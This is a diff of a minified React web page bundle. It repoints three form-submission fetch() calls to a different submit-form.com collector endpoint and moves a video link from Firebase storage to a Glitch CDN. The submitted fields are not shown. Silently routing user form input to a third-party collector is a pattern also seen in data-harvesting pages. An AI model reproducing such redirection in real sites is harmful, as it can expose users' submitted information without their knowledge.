@@ -9814,7 +9814,7 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/qfkfXNfkg", {
+                                    fetch("https://submit-form.com/ZO8e8fM5u", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13339,7 +13339,7 @@
                                 children: "Detailed Video Information."
                             }), (0,
                             he.jsx)("a", {
-                                href: "https://firebasestorage.googleapis.com/v0/b/chatapp-3655a.appspot.com/o/video.mp4?alt=media&token=da89bb25-84a0-4ca6-b642-165578e6ca72",
+                                href: "https://cdn.glitch.global/31b556b9-4313-4d9d-9619-ee4546696f71/detailed-video.mp4?v=1732333110082",
                                 children: (0,
                                 he.jsx)("img", {
                                     src: me,
@@ -13358,7 +13358,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/qfkfXNfkg", {
+                                    u && o ? (fetch("https://submit-form.com/ZO8e8fM5u", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/qfkfXNfkg", {
+                        fetch("https://submit-form.com/ZO8e8fM5u", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
